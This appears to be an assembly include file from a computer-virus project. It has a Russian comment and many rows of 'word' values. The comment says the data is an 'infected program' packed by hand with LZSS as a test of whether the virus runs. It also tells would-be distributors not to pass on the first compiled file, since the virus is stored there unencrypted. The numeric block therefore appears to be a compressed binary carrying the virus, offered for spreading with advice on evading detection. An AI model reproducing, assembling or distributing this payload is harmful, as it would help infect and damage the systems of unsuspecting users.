;
;	"Зараженная программка". Просто упаковал ее вручную через lzss.inc.
;	Так, просто чтобы было видно, запустился вирус или нет :)
;	Если вы собираетесь передать вирус, то ни в коем случае не
;	впервые откомпилированный файл с этой программкой - тут
;	вирус хранится в незашифрованном виде.
;
word 2484,-30534,-13055,-19423,-13008,20513,-7118,5096,-18430,3630,4301,-30120,12996,-5916,518,-25670
word 1598,11007,8653,12882,-15900,1256,-19195,6657,-250,-30118,12994,-5916,484,-14710,-14082,-7118
word -7999,1284,549,-12149,1041,-29697,-5951,461,8376,-13042,-17904,422,2484,8653,11444,8653
word -14966,-7118,-18712,1038,-6657,-13054,-30175,12993,-5916,424,2484,-4678,-13054,-18399,19456,8653
word 3338,3338,21325,17453,21327,-24032,-8027,-22303,8360,2596,-28403,-23643,-23378,1238,-23553,-23378
word 11936,3338,-8062,-21339,15087,9248,-20830,-21791,-23072,-23071,-4947,4261,-251,-20817,-23123,-23132
word -4949,2060,-23809,-20766,-21024,-21848,2608,-7937,-23387,3169,-6145,-7515,-23134,-23584,2320,-20481
word -7441,-22355,-28186,-245,-24093,-20831,3119,-4097,-23891,-24416,-244,-23068,-8030,8096,-245,-24404
word 21216,-245,8224,-20576,-23072,3118,-21249,4512,-243,-22496,-21010,3344,-22273,-21522,2882,8447
word -24544,-23646,-7709,-24350,2336,-7681,-21083,3343,-20737,-7510,3343,-20993,-4178,3089,8447,-23132
word -24406,-8031,8431,292,-250,-6368,-7776,-23890,9248,-21472,-21080,-7453,2606,9229,20576,20560
word -5951,-6132,1812,-252,-6136,13,-16040,1256,1768,22528,744,24832,9411,1039,15408,29242
word 1026,-19449,-13042,-15600,21328,21073,-18089,5,23999,11779,1339,2931,18247,-2078,7608,-252
word 3307,-11725,-29906,-6115,10,18247,-2334,23135,23385,-15528,-11725,-3081,12293,-13042,-29936,-15422
word 10000,1000,100,10,257,-1,-255,511,-1,-255,511,-1,-255,511,-1,-255
word 511,-1,-255,511,-1,-255,511,-1,-255,511,-1,-20991,255,0
